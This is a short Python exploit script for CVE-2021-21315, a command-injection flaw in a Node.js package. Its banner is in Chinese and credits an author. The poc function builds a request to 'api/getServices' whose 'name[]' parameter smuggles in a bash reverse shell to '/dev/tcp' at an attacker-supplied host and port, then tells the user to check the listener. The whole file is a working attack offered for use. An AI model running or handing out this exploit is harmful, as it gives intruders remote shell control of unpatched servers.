import sys
import requests

def title():
    print("[-------------------------------------------------------------]")
    print("[--------------      node.js命令执行漏洞      ---------------]")
    print("[--------               CVE-2021-21315              ----------]")
    print("[--------    use:python3 CVE-2021-21315.py Lhost Lport --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")

def main(url,ip,port) :
    if (len(sys.argv)==4):
        poc(url,ip,port)
    else :
        print("Example: \n   python3 " + sys.argv[0] + "lhost" + "lport" + "\n")

def poc(url,ip,port) :
    name= "api/getServices?name[]=$(bash%20-i%20%3E%26%20/dev/tcp/"+ ip +"/" + port +"%200%3E%261)"
    r = requests.get(url=url+name,verify=False)
    print("[+] Check your listener")


if __name__ == "__main__" :
    title()
    url = sys.argv[1]
    ip = sys.argv[2]
    port = sys.argv[3]
    main(url,ip,port)
